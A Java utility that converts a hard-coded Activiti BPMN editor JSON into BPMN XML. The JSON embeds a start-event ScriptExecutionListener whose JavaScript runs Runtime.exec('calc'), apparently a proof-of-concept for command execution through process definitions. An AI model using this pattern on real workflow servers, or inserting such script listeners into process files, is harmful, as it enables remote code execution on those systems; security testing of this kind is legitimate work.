package org.activiti;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.activiti.bpmn.converter.BpmnXMLConverter;
import org.activiti.bpmn.model.BpmnModel;
import org.activiti.editor.language.json.converter.BpmnJsonConverter;

import java.nio.charset.StandardCharsets;

public class Json2Xml {
    public static void main(String[] args) {
        try {
            // JSON字符串，这里的字符串如果不完整正确的（不是有效的BPMN格式JSON字符串）会报错
            String jsonStr = "{\"bounds\":{\"lowerRight\":{\"x\":1485.0,\"y\":700.0},\"upperLeft\":{\"x\":0.0,\"y\":0.0}},\"resourceId\":\"canvas\",\"stencil\":{\"id\":\"BPMNDiagram\"},\"stencilset\":{\"namespace\":\"http://b3mn.org/stencilset/bpmn2.0#\",\"url\":\"../editor/stencilsets/bpmn2.0/bpmn2.0.json\"},\"properties\":{\"process_id\":\"hireProcessWithexecutionListener\",\"name\":\"Developer Hiring\",\"process_namespace\":\"http://www.activiti.org/processdef\",\"messages\":[],\"executionlisteners\":{\"executionListeners\":[{\"event\":\"start\",\"className\":\"org.activiti.engine.impl.bpmn.listener.ScriptExecutionListener\",\"fields\":[{\"name\":\"script\",\"stringValue\":\"var a=java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"},{\"name\":\"language\",\"stringValue\":\"js\"},{\"name\":\"resultVariable\",\"stringValue\":\"a\"}]}]},\"eventlisteners\":{\"eventListeners\":[]},\"signaldefinitions\":[{\"id\":\"cancelApplication\",\"name\":\"cancelApplication\",\"scope\":null}],\"messagedefinitions\":[]},\"childShapes\":[{\"bounds\":{\"lowerRight\":{\"x\":200.0,\"y\":265.0},\"upperLeft\":{\"x\":170.0,\"y\":235.0}},\"resourceId\":\"sid-E0DD2D8E-0672-4BE0-97A4-933DD8771EFF\",\"childShapes\":[],\"stencil\":{\"id\":\"StartNoneEvent\"},\"properties\":{\"overrideid\":\"sid-E0DD2D8E-0672-4BE0-97A4-933DD8771EFF\",\"executionlisteners\":{\"executionListeners\":[]}},\"outgoing\":[{\"resourceId\":\"sid-228a0741-8bf0-4603-9d25-19943b3917d8\"}]},{\"bounds\":{\"lowerRight\":{\"x\":375.0,\"y\":295.0},\"upperLeft\":{\"x\":275.0,\"y\":215.0}},\"resourceId\":\"sid-b08887e7-fa3e-449e-9c69-8b619bd09bdb\",\"childShapes\":[],\"stencil\":{\"id\":\"UserTask\"},\"properties\":{\"overrideid\":\"sid-b08887e7-fa3e-449e-9c69-8b619bd09bdb\",\"name\":\"userTask\",\"usertaskassignment\":{\"assignment\":{\"type\":\"static\",\"assignee\":\"test\",\"candidateGroups\":[{\"value\":\"dev-managers\"}]}},\"asynchronousdefinition\":false,\"exclusivedefinition\":true,\"tasklisteners\":{\"taskListeners\":[]},\"executionlisteners\":{\"executionListeners\":[]}},\"outgoing\":[{\"resourceId\":\"sid-ec6004f9-9ba4-4e7d-a9d6-2b86bd908864\"}]},{\"bounds\":{\"lowerRight\":{\"x\":172.0,\"y\":212.0},\"upperLeft\":{\"x\":128.0,\"y\":212.0}},\"resourceId\":\"sid-228a0741-8bf0-4603-9d25-19943b3917d8\",\"childShapes\":[],\"stencil\":{\"id\":\"SequenceFlow\"},\"dockers\":[{\"x\":15.0,\"y\":15.0},{\"x\":50.0,\"y\":40.0}],\"outgoing\":[{\"resourceId\":\"sid-b08887e7-fa3e-449e-9c69-8b619bd09bdb\"}],\"target\":{\"resourceId\":\"sid-b08887e7-fa3e-449e-9c69-8b619bd09bdb\"},\"properties\":{\"overrideid\":\"sid-228a0741-8bf0-4603-9d25-19943b3917d8\"}},{\"bounds\":{\"lowerRight\":{\"x\":565.0,\"y\":275.00002},\"upperLeft\":{\"x\":535.0,\"y\":245.00002}},\"resourceId\":\"sid-90bb0d22-d2d4-4eb6-9a6d-b23f2cdc8688\",\"childShapes\":[],\"stencil\":{\"id\":\"EndNoneEvent\"},\"properties\":{\"overrideid\":\"sid-90bb0d22-d2d4-4eb6-9a6d-b23f2cdc8688\",\"executionlisteners\":{\"executionListeners\":[]}},\"outgoing\":[]},{\"bounds\":{\"lowerRight\":{\"x\":172.0,\"y\":212.0},\"upperLeft\":{\"x\":128.0,\"y\":212.0}},\"resourceId\":\"sid-ec6004f9-9ba4-4e7d-a9d6-2b86bd908864\",\"childShapes\":[],\"stencil\":{\"id\":\"SequenceFlow\"},\"dockers\":[{\"x\":50.0,\"y\":40.0},{\"x\":15.0,\"y\":15.0}],\"outgoing\":[{\"resourceId\":\"sid-90bb0d22-d2d4-4eb6-9a6d-b23f2cdc8688\"}],\"target\":{\"resourceId\":\"sid-90bb0d22-d2d4-4eb6-9a6d-b23f2cdc8688\"},\"properties\":{\"overrideid\":\"sid-ec6004f9-9ba4-4e7d-a9d6-2b86bd908864\"}}]}";

            // 将JSON字符串转换为ObjectNode
            ObjectMapper objectMapper = new ObjectMapper();
            ObjectNode editorJsonNode = (ObjectNode) objectMapper.readTree(jsonStr);

            // JSON转换为BpmnModel
            BpmnJsonConverter jsonConverter = new BpmnJsonConverter();
            BpmnModel bpmnModel = jsonConverter.convertToBpmnModel(editorJsonNode);

            // BpmnModel转换为XML
            BpmnXMLConverter xmlConverter = new BpmnXMLConverter();
            byte[] bpmnBytes = xmlConverter.convertToXML(bpmnModel);

            // 输出XML
            System.out.println(new String(bpmnBytes, StandardCharsets.UTF_8));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
